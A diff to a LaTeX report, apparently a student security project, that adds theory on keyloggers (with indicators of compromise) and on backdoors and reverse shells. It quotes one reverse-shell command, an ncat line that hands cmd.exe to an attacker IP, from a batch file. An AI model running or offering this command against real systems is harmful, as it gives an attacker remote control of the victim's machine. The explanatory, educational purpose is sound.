@@ -5,6 +5,8 @@
 	\usepackage{subcaption}  % For creating subfigures
 	\usepackage{float}       % For the [H] placement specifier
 	\usepackage{xcolor}
+	\setlength{\parindent}{15pt}  % default is about 15pt
+	\setlength{\parskip}{0pt}
 	\onehalfspacing
 	
 	\begin{document}
@@ -85,7 +87,21 @@
 				
 			\subsection{Theoretical Overview of Attacker Techniques Investigated}
 				\subsubsection{Keyloggers}
+					A Keylogger is a type of surveillance software or hardware that records every keystroke made on a computer. It can be used to collect sensitive information suck as login credentials, credit cards numbers, personal messages and other confidential data. Keyloggers can be software-based, that is a process running on the victim's machine, or hardware-based. This project focuses on software-based keyloggers.
+					The common method of detecting a Keylogger are called \textbf{Indicators of Compromise (IOCs)}; such as:
+					\begin{itemize}
+						\item Unusual network traffic: if the keylogger sends logs remotely
+						\item Unexpected new processes or files (often hidden)
+						\item Performance degradation: less common with well-written keyloggers
+						\item anti-keylogger software alerts
+					\end{itemize}
+					The script 'keylog.py' is an example of a software-based keylogger.
+					
 				\subsubsection{Backdoors and Remote Access}
+					A backdoor is a covert method of bypassing normal authentication or encryption in a computer system, and application, or an embedded device.\par
+					It allows unauthorized remote access to a system, enabling attackers to control the compromised machine, exfiltrate data, or use it as a pivot point for further attacks.\par
+					Backdoors can be established trough various means, including exploiting vulnerabilities, installing malicious software, or using legitimate remote administration tools for malicious purposes. Common methods include Reverse Shells, in which the compromised machine initiates an outbound connection to an attacker-controlled server, often used to bypass firewalls that restrict inbound connections. The command \texttt{'ncat 172.20.10.15 -e cmd.exe'} in \texttt{'commands.bat'} code attempts to establish a reverse shell, by creating a TCP/IP connection from the victim's computer to the attacker IP address
+		
 				\subsubsection{Non-Visual Command Execution and Process Hiding}
 				\subsubsection{Process Injection and Memory Manipulation}
 				\subsubsection{Persistence Techniques}
